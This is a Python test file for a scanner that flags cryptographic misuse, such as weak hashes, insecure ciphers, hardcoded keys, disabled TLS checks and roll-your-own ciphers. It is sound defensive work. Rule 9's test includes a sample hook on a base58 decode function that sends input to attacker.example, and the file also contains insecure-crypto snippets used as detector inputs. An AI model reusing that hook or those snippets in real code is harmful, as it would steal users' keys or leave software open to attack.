"""Tests for scripts/lib/crypto_misuse_patterns.py.

Pattern-coverage tests for the Wave-18 distillation round 4 angle A
catalogue (crypto-primitive misuse). Each of the 12 rules gets 3-5
tests: 1-2 positive, 1-2 negative, 1 edge case.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import crypto_misuse_patterns as cmp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(cmp.RULES, tuple)
    rule_ids = {r.id for r in cmp.RULES}
    expected = {
        "crypto.weak-hash-md5-sha1-in-security-path",
        "crypto.insecure-cipher-or-mode",
        "crypto.timing-unsafe-comparison-on-hash-or-mac",
        "crypto.hardcoded-key-iv-or-nonce-literal",
        "crypto.insecure-rng-for-security-value",
        "crypto.weak-kdf-or-low-iterations",
        "crypto.rsa-pkcs1-v15-padding-for-encryption",
        "crypto.tls-verify-disabled-non-jwt-context",
        "crypto.runtime-hook-of-crypto-decode-entrypoint",
        "crypto.aes-gcm-nonce-reuse-pattern",
        "crypto.encrypt-without-authentication",
        "crypto.custom-roll-your-own-cipher-or-hash",
    }
    assert expected.issubset(rule_ids), expected - rule_ids


def test_every_rule_has_owasp_mapping() -> None:
    """Every rule must declare an OWASP-ASI mapping + valid severity."""
    for rule in cmp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the auth_flow_patterns.Finding shape."""
    f = cmp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-08",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.severity == "HIGH"
    assert f.owasp_asi == "ASI-08"


def test_scan_empty_text() -> None:
    """Empty text yields zero findings (no exception, no crash)."""
    assert cmp.scan_text("") == []


# ---------- helper -------------------------------------------------------


def _hits(rule_id: str, text: str, *, filename: str = "") -> list:
    return [
        f for f in cmp.scan_text(text, filename=filename)
        if f.rule_id == rule_id
    ]


# ---------- Rule 1 : crypto.weak-hash-md5-sha1-in-security-path ----------


def test_weak_hash_python_md5_positive() -> None:
    """Python `hashlib.md5(password)` must fire."""
    src = "h = hashlib.md5(password.encode()).hexdigest()\n"
    assert _hits("crypto.weak-hash-md5-sha1-in-security-path", src)


def test_weak_hash_node_createhash_sha1_positive() -> None:
    """Node `crypto.createHash('sha1')` must fire."""
    src = "const h = crypto.createHash('sha1').update(data).digest('hex');\n"
    assert _hits("crypto.weak-hash-md5-sha1-in-security-path", src)


def test_weak_hash_java_md5_positive() -> None:
    """Java `MessageDigest.getInstance('MD5')` must fire."""
    src = 'MessageDigest md = MessageDigest.getInstance("MD5");\n'
    assert _hits("crypto.weak-hash-md5-sha1-in-security-path", src)


def test_weak_hash_filename_carveout_cache_path() -> None:
    """Filename hint `cache_etag.py` suppresses the hit."""
    src = "h = hashlib.md5(content).hexdigest()\n"
    assert not _hits(
        "crypto.weak-hash-md5-sha1-in-security-path",
        src,
        filename="cache_etag.py",
    )


def test_weak_hash_pragma_carveout() -> None:
    """An inline `# non-security` comment within 3 lines suppresses."""
    src = (
        "# non-security: ETag fingerprint for HTTP cache\n"
        "etag = hashlib.md5(content).hexdigest()\n"
    )
    assert not _hits("crypto.weak-hash-md5-sha1-in-security-path", src)


# ---------- Rule 2 : crypto.insecure-cipher-or-mode ----------------------


def test_insecure_cipher_java_des_positive() -> None:
    """Java `Cipher.getInstance('DES')` must fire."""
    src = 'Cipher c = Cipher.getInstance("DES");\n'
    assert _hits("crypto.insecure-cipher-or-mode", src)


def test_insecure_cipher_aes_ecb_positive() -> None:
    """Java `Cipher.getInstance('AES/ECB/...')` must fire."""
    src = 'Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");\n'
    assert _hits("crypto.insecure-cipher-or-mode", src)


def test_insecure_cipher_node_rc4_positive() -> None:
    """Node `crypto.createCipheriv('rc4', ...)` must fire."""
    src = "const c = crypto.createCipheriv('rc4', key, '');\n"
    assert _hits("crypto.insecure-cipher-or-mode", src)


def test_insecure_cipher_aes_gcm_not_flagged() -> None:
    """Modern AES-GCM is the recommended cipher — must NOT fire."""
    src = (
        'Cipher c = Cipher.getInstance("AES/GCM/NoPadding");\n'
    )
    assert not _hits("crypto.insecure-cipher-or-mode", src)


def test_insecure_cipher_legacy_decrypt_pragma_suppresses() -> None:
    """`// legacy decrypt only` pragma suppresses."""
    src = (
        "// legacy decrypt only — recovering 2014 ciphertext archive\n"
        'Cipher c = Cipher.getInstance("DESede");\n'
    )
    assert not _hits("crypto.insecure-cipher-or-mode", src)


# ---------- Rule 3 : crypto.timing-unsafe-comparison-on-hash-or-mac -----


def test_timing_unsafe_signature_equality_positive() -> None:
    """`if signature == expected_sig:` is a textbook timing leak."""
    src = "if signature == expected_sig: pass\n"
    assert _hits("crypto.timing-unsafe-comparison-on-hash-or-mac", src)


def test_timing_unsafe_hmac_negation_positive() -> None:
    """`if hmac != computed_hmac:` is also the leak shape."""
    src = "if hmac != computed_hmac: raise\n"
    assert _hits("crypto.timing-unsafe-comparison-on-hash-or-mac", src)


def test_timing_unsafe_against_hex_literal_positive() -> None:
    """`digest == '<hex>'` where the literal is 32+ hex chars fires."""
    src = (
        "if digest == "
        "'5d41402abc4b2a76b9719d911017c592': pass\n"
    )
    assert _hits("crypto.timing-unsafe-comparison-on-hash-or-mac", src)


def test_timing_unsafe_non_crypto_var_no_hit() -> None:
    """`if count == 5:` has no crypto noun — must NOT fire."""
    src = "if count == 5: pass\n"
    assert not _hits("crypto.timing-unsafe-comparison-on-hash-or-mac", src)


def test_timing_unsafe_test_filename_suppresses() -> None:
    """Tests intentionally do `signature == expected` — exempt."""
    src = "if signature == expected_sig: pass\n"
    assert not _hits(
        "crypto.timing-unsafe-comparison-on-hash-or-mac",
        src,
        filename="test_signing.py",
    )


# ---------- Rule 4 : crypto.hardcoded-key-iv-or-nonce-literal -----------


def test_hardcoded_key_hex_literal_positive() -> None:
    """`key = '0123...abcdef...'` (32+ hex) fires."""  # gitleaks:allow  pragma: allowlist secret
    src = 'key = "0123456789abcdef0123456789abcdef"\n'  # gitleaks:allow  pragma: allowlist secret
    assert _hits("crypto.hardcoded-key-iv-or-nonce-literal", src)


def test_hardcoded_iv_bytes_fromhex_positive() -> None:
    """`iv = bytes.fromhex('...')` 32+ hex chars fires."""
    src = "iv = bytes.fromhex('00112233445566778899aabbccddeeff')\n"  # gitleaks:allow  pragma: allowlist secret
    assert _hits("crypto.hardcoded-key-iv-or-nonce-literal", src)


def test_hardcoded_signing_key_buffer_from_hex_positive() -> None:
    """`signing_key = Buffer.from('<hex>', 'hex')` fires."""
    src = (
        "const signing_key = Buffer.from("
        "'deadbeef1234567890abcdef12345678', 'hex');\n"
    )
    assert _hits("crypto.hardcoded-key-iv-or-nonce-literal", src)


def test_hardcoded_key_from_env_no_hit() -> None:
    """`key = os.environ['KEY']` is the SAFE pattern — must NOT fire."""
    src = "key = os.environ['ENCRYPTION_KEY']\n"
    assert not _hits("crypto.hardcoded-key-iv-or-nonce-literal", src)


def test_hardcoded_key_test_filename_suppresses() -> None:
    """RFC test-vector files routinely pin key material — exempt."""
    src = 'key = "00112233445566778899aabbccddeeff"\n'  # gitleaks:allow  pragma: allowlist secret
    assert not _hits(
        "crypto.hardcoded-key-iv-or-nonce-literal",
        src,
        filename="test_vectors_aes_gcm.py",
    )


# ---------- Rule 5 : crypto.insecure-rng-for-security-value -------------


def test_insecure_rng_random_choice_for_token_positive() -> None:
    """`token = random.choice(chars) for _ in ...` fires."""
    src = (
        "token = ''.join(random.choice(chars) for _ in range(32))\n"
    )
    assert _hits("crypto.insecure-rng-for-security-value", src)


def test_insecure_rng_math_random_session_id_positive() -> None:
    """`Math.random()` next to `session` fires."""
    src = (
        "const session_id = Math.random().toString(36).slice(2);\n"
    )
    assert _hits("crypto.insecure-rng-for-security-value", src)


def test_insecure_rng_java_util_random_password_positive() -> None:
    """`new Random()` near `password` fires."""
    src = "Random r = new Random(); String password = generate(r);\n"
    assert _hits("crypto.insecure-rng-for-security-value", src)


def test_insecure_rng_no_security_keyword_no_hit() -> None:
    """`random.randint(1, 100)` with no security keyword — no fire."""
    src = "dice = random.randint(1, 6)\n"
    assert not _hits("crypto.insecure-rng-for-security-value", src)


def test_insecure_rng_secrets_token_urlsafe_no_hit() -> None:
    """Correct generator `secrets.token_urlsafe(32)` — no fire."""
    src = "token = secrets.token_urlsafe(32)\n"
    assert not _hits("crypto.insecure-rng-for-security-value", src)


# ---------- Rule 6 : crypto.weak-kdf-or-low-iterations -----------------


def test_weak_kdf_pbkdf2_low_iterations_positive() -> None:
    """`pbkdf2_hmac('sha256', pw, salt, 1000)` fires."""
    src = "dk = pbkdf2_hmac('sha256', pw, salt, 1000)\n"
    assert _hits("crypto.weak-kdf-or-low-iterations", src)


def test_weak_kdf_pbkdf2_sha1_positive() -> None:
    """`hashlib.pbkdf2_hmac('sha1', ...)` is weak by hash choice."""
    src = "dk = hashlib.pbkdf2_hmac('sha1', pw, salt, 600000)\n"
    assert _hits("crypto.weak-kdf-or-low-iterations", src)


def test_weak_kdf_bcrypt_cost_8_positive() -> None:
    """`bcrypt.gensalt(8)` is below the 2025 floor of 12."""
    src = "salt = bcrypt.gensalt(8)\n"
    assert _hits("crypto.weak-kdf-or-low-iterations", src)


def test_strong_kdf_pbkdf2_high_iterations_no_hit() -> None:
    """`pbkdf2_hmac('sha256', pw, salt, 600000)` is strong — no fire."""
    src = "dk = pbkdf2_hmac('sha256', pw, salt, 600000)\n"
    assert not _hits("crypto.weak-kdf-or-low-iterations", src)


# ---------- Rule 7 : crypto.rsa-pkcs1-v15-padding-for-encryption ------


def test_rsa_pkcs1v15_python_positive() -> None:
    """Python cryptography lib: `padding.PKCS1v15()` fires."""
    src = "ct = key.encrypt(pt, padding.PKCS1v15())\n"
    assert _hits("crypto.rsa-pkcs1-v15-padding-for-encryption", src)


def test_rsa_pkcs1v15_java_positive() -> None:
    """Java `Cipher.getInstance('RSA/ECB/PKCS1Padding')` fires."""
    src = 'Cipher c = Cipher.getInstance("RSA/ECB/PKCS1Padding");\n'
    assert _hits("crypto.rsa-pkcs1-v15-padding-for-encryption", src)


def test_rsa_pkcs1v15_signing_context_suppresses() -> None:
    """A line that ALSO contains `verify_signature` — signing, OK."""
    src = "key.verify_signature(sig, msg, padding.PKCS1v15())\n"
    assert not _hits("crypto.rsa-pkcs1-v15-padding-for-encryption", src)


def test_rsa_oaep_not_flagged() -> None:
    """Modern OAEP padding must NOT fire."""
    src = "ct = key.encrypt(pt, padding.OAEP(...))\n"
    assert not _hits("crypto.rsa-pkcs1-v15-padding-for-encryption", src)


# ---------- Rule 8 : crypto.tls-verify-disabled-non-jwt-context -------


def test_tls_verify_off_python_requests_positive() -> None:
    """`requests.get(url, verify=False)` fires."""
    src = "r = requests.get('https://api.example.com', verify=False)\n"
    assert _hits("crypto.tls-verify-disabled-non-jwt-context", src)


def test_tls_verify_off_node_reject_unauthorized_positive() -> None:
    """`rejectUnauthorized: false` fires."""
    src = "const agent = new https.Agent({ rejectUnauthorized: false });\n"
    assert _hits("crypto.tls-verify-disabled-non-jwt-context", src)


def test_tls_verify_off_go_insecure_skip_verify_positive() -> None:
    """Go `InsecureSkipVerify: true` fires."""
    src = "tlsConfig := &tls.Config{InsecureSkipVerify: true}\n"
    assert _hits("crypto.tls-verify-disabled-non-jwt-context", src)


def test_tls_verify_off_localhost_suppresses() -> None:
    """Same-line `localhost` URL suppresses (local dev)."""
    src = "r = requests.get('https://localhost:8443/x', verify=False)\n"
    assert not _hits("crypto.tls-verify-disabled-non-jwt-context", src)


def test_tls_verify_off_pragma_suppresses() -> None:
    """`# local dev only` pragma in context suppresses."""
    src = (
        "# local dev only — staging cert self-signed\n"
        "r = requests.get('https://staging.example.com', verify=False)\n"
    )
    assert not _hits("crypto.tls-verify-disabled-non-jwt-context", src)


# ---------- Rule 9 : crypto.runtime-hook-of-crypto-decode-entrypoint --


def test_runtime_hook_bs58decode_positive() -> None:
    """The argus fixture: `globalThis.bs58Decode = ...` fires."""
    src = (
        "globalThis.bs58Decode = function intercept(input) {\n"
        "  fetch('https://attacker.example/exfil', {body: input});\n"
        "  return realDecode(input);\n"
        "};\n"
    )
    assert _hits("crypto.runtime-hook-of-crypto-decode-entrypoint", src)


def test_runtime_hook_keccak256_positive() -> None:
    """`window.keccak256 = ...` fires (ethereum-stealer pattern)."""
    src = "window.keccak256 = function (data) { return hook(data); };\n"
    assert _hits("crypto.runtime-hook-of-crypto-decode-entrypoint", src)


def test_runtime_hook_polyfill_filename_suppresses() -> None:
    """A polyfill filename is the only legitimate writer — exempt."""
    src = "globalThis.crypto.subtle.encrypt = subtle_polyfill;\n"
    assert not _hits(
        "crypto.runtime-hook-of-crypto-decode-entrypoint",
        src,
        filename="crypto-polyfill.js",
    )


def test_runtime_hook_read_not_assignment_no_hit() -> None:
    """READING `globalThis.crypto.subtle.encrypt` does not fire."""
    src = "const fn = globalThis.crypto.subtle.encrypt;\n"
    assert not _hits("crypto.runtime-hook-of-crypto-decode-entrypoint", src)


# ---------- Rule 10 : crypto.aes-gcm-nonce-reuse-pattern --------------


def test_gcm_nonce_python_bytes_zero_buffer_positive() -> None:
    """`nonce = bytes(12)` is a fixed-zero buffer — fires."""
    src = "nonce = bytes(12)\n"
    assert _hits("crypto.aes-gcm-nonce-reuse-pattern", src)


def test_gcm_nonce_node_buffer_alloc_positive() -> None:
    """`nonce = Buffer.alloc(12)` is the Node form — fires."""
    src = "const nonce = Buffer.alloc(12);\n"
    assert _hits("crypto.aes-gcm-nonce-reuse-pattern", src)


def test_gcm_nonce_to_bytes_positive() -> None:
    """`nonce = (0).to_bytes(12, 'big')` is the Python int form."""
    src = "nonce = 0 .to_bytes(12, 'big')\n"
    assert _hits("crypto.aes-gcm-nonce-reuse-pattern", src)


def test_gcm_nonce_random_no_hit() -> None:
    """`nonce = os.urandom(12)` is the SAFE pattern — no fire."""
    src = "nonce = os.urandom(12)\n"
    assert not _hits("crypto.aes-gcm-nonce-reuse-pattern", src)


def test_gcm_nonce_test_vector_suppresses() -> None:
    """`# test vector` pragma suppresses the hit."""
    src = (
        "# RFC test vector — deterministic nonce for known-answer test\n"
        "nonce = bytes(12)\n"
    )
    assert not _hits("crypto.aes-gcm-nonce-reuse-pattern", src)


# ---------- Rule 11 : crypto.encrypt-without-authentication ----------


def test_encrypt_no_mac_aes_cbc_positive() -> None:
    """AES-CBC alone in file (no HMAC) fires."""
    src = (
        'Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");\n'
        "c.init(Cipher.ENCRYPT_MODE, key);\n"
        "byte[] ct = c.doFinal(plaintext);\n"
    )
    assert _hits("crypto.encrypt-without-authentication", src)


def test_encrypt_no_mac_node_cbc_positive() -> None:
    """Node `crypto.createCipheriv('aes-256-cbc', ...)` alone fires."""
    src = "const c = crypto.createCipheriv('aes-256-cbc', key, iv);\n"
    assert _hits("crypto.encrypt-without-authentication", src)


def test_encrypt_with_paired_hmac_suppresses() -> None:
    """If the file ALSO contains an HMAC, Encrypt-then-MAC is OK."""
    src = (
        'Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");\n'
        'Mac mac = Mac.getInstance("HmacSHA256");\n'
        "mac.init(mac_key);\n"
    )
    assert not _hits("crypto.encrypt-without-authentication", src)


def test_encrypt_with_python_hmac_compare_digest_suppresses() -> None:
    """Python `hmac.compare_digest` in file → Encrypt-then-MAC OK."""
    src = (
        "from cryptography.hazmat.primitives.ciphers import modes\n"
        "cipher = Cipher(algorithms.AES(key), modes.CBC(iv))\n"
        "import hmac\n"
        "ok = hmac.compare_digest(tag, computed)\n"
    )
    assert not _hits("crypto.encrypt-without-authentication", src)


def test_encrypt_aes_gcm_not_flagged() -> None:
    """AES-GCM is authenticated by construction — no fire."""
    src = (
        'Cipher c = Cipher.getInstance("AES/GCM/NoPadding");\n'
    )
    assert not _hits("crypto.encrypt-without-authentication", src)


# ---------- Rule 12 : crypto.custom-roll-your-own-cipher-or-hash -----


def test_roll_your_own_python_xor_encrypt_positive() -> None:
    """`def xor_encrypt(...)` with XOR body fires."""
    src = (
        "def xor_encrypt(msg, key):\n"
        "    return bytes(c ^ k for c, k in zip(msg, key))\n"
    )
    assert _hits("crypto.custom-roll-your-own-cipher-or-hash", src)


def test_roll_your_own_js_caesar_cipher_positive() -> None:
    """`function caesar_cipher(...)` with shift body fires."""
    src = (
        "function caesar_cipher(text, shift) {\n"
        "  return text.split('').map(c => String.fromCharCode("
        "((c.charCodeAt(0) - 65 + shift) % 26) + 65)).join('');\n"
        "}\n"
    )
    assert _hits("crypto.custom-roll-your-own-cipher-or-hash", src)


def test_roll_your_own_python_my_hash_with_xor_positive() -> None:
    """`def my_hash` whose body uses `<<` qualifies."""
    src = (
        "def my_hash(s):\n"
        "    h = 0\n"
        "    for ch in s:\n"
        "        h = (h << 5) - h + ord(ch)\n"
        "    return h & 0xffffffff\n"
    )
    assert _hits("crypto.custom-roll-your-own-cipher-or-hash", src)


def test_roll_your_own_no_cipher_arith_no_hit() -> None:
    """`def my_hash` with no cipher arithmetic — does NOT fire."""
    src = (
        "def my_hash(d):\n"
        "    return str(d)\n"
    )
    assert not _hits("crypto.custom-roll-your-own-cipher-or-hash", src)


def test_roll_your_own_ctf_filename_suppresses() -> None:
    """CTF-style files legitimately implement toy ciphers — exempt."""
    src = (
        "def xor_cipher(msg, key):\n"
        "    return bytes(c ^ k for c, k in zip(msg, key))\n"
    )
    assert not _hits(
        "crypto.custom-roll-your-own-cipher-or-hash",
        src,
        filename="ctf_challenge.py",
    )


# ---------- Cross-cutting --------------------------------------------


def test_dedup_same_rule_same_position() -> None:
    """Two passes over the same offset must not produce two findings."""
    src = (
        "token = ''.join(random.choice(chars) for _ in range(32))\n"
    )
    # Rule 5 has a forward AND reverse pass — same offset should dedup.
    hits = _hits("crypto.insecure-rng-for-security-value", src)
    # At most one hit at line=1 col=1 (forward) plus possibly the
    # reverse pass — but the forward and reverse should not produce
    # duplicates at the same (line, col).
    positions = {(h.line, h.column) for h in hits}
    assert len(positions) == len(hits)


def test_findings_sorted_by_line_col() -> None:
    """Findings ordering: by (line, col, rule_id)."""
    src = (
        "h = hashlib.md5(x).hexdigest()\n"
        "k = 'deadbeef0123456789abcdef01234567'\n"
        "key = 'deadbeef0123456789abcdef01234567'\n"
    )
    fs = cmp.scan_text(src)
    lines = [f.line for f in fs]
    assert lines == sorted(lines)


def test_long_match_text_truncated() -> None:
    """A match longer than 200 chars must be truncated with ellipsis."""
    # Construct an artificially long base64-ish literal assignment.
    long_blob = "A" * 250
    src = f"key = '{long_blob}'\n"
    fs = _hits("crypto.hardcoded-key-iv-or-nonce-literal", src)
    assert fs
    for f in fs:
        assert len(f.matched_text) <= 201  # 200 + "…"


def test_scan_returns_list_of_finding_instances() -> None:
    """scan_text yields cmp.Finding instances (not raw tuples)."""
    src = "h = hashlib.md5(x).hexdigest()\n"
    fs = cmp.scan_text(src)
    assert all(isinstance(f, cmp.Finding) for f in fs)
